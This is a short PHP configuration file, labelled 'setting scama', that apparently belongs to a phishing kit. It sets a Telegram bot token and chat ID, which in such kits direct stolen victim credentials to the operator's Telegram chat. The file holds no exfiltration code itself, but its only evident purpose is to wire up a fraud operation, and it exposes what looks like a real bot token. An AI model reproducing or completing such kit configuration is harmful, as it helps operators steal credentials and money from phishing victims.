<?php
// setting scama

$botToken="5773259212:AAEnKhveGuqQBpV_faAharz7VWTuMYSpBd4"; // token bot telegram
$chatId="1806049682";  // chatId telegram

?>
